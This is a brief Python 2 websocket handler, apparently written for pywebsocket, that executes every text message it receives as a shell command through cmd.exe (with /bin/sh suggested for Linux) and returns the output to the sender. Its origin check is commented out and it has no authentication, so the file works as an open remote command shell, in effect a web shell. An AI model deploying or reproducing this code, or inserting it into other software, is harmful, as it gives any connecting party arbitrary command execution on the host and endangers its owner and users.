import subprocess

def web_socket_do_extra_handshake(request):
	#if request.ws_origin == 'http://localhost':
    #    return
    #raise ValueError('Unacceptable origin: %r' % request.ws_origin)
    pass  # Always accept. # Can someone add this?


def web_socket_transfer_data(request):
    while True:
        line = request.ws_stream.receive_message()
        if line is None:
            return
        if isinstance(line, unicode):
			print 'Recieved from ' + request.ws_origin + ': ' + line
			# For Linux, use '/bin/sh '
			proc = subprocess.Popen('cmd.exe /c ' + line, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			out = proc.stdout.read() + proc.stderr.read()
			request.ws_stream.send_message(out, binary=False)
        else:
            request.ws_stream.send_message('Non unicode data received! Send text please :)', binary=True)
